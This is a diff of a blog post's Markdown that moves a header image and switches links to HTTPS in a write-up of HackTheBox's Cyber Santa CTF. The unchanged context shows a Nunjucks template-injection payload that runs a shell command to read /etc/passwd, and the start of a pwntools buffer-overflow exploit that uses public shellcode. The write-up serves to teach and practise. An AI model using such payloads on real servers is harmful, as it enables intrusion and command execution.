@@ -4,9 +4,9 @@ date: 2021-12-07 05:11:00 +0800
 categories: [ctf]
 tags: [web, forensics, rev, pwn, crypto]
 render_with_liquid: false
+image:
+    path: /assets/images/cybersanta.jpg
 ---
-
-![](/assets/images/cybersanta.jpg){:height="414px" width="615px"}
 
 With the school semester just ended and the holiday break starting, I finally had the time to do something hacking-related. HackTheBox was publicising this CTF as "beginner-friendly" and I felt that it would be a great warmup to get rid of my rusty-ness. But turns out, I ended up learning a lot, especially in binary exploitation. Overall, I had a blast and I was satisfied with my performance after months of inactivity.
 
@@ -764,7 +764,7 @@ After updating it and if we go back to the home page and open up the card,
 
 We see that `49` was rendered in the naughty list, therefore proving that a Server-Side Template Injection vulnerability existed!
 
-Searching online, I found a working payload [here](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine).
+Searching online, I found a working payload [here](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine).
 
 ```js
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
@@ -1063,7 +1063,7 @@ offset = 72
 address = p64(int(re.search(b"\[(0x.*?)\]", prompt1).group(1).decode(), 16))             
 ```
 
-Now lets put together everything and add the shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-806.php).
+Now lets put together everything and add the shellcode from [here](https://shell-storm.org/shellcode/files/shellcode-806.php).
 
 ```python
 from pwn import *
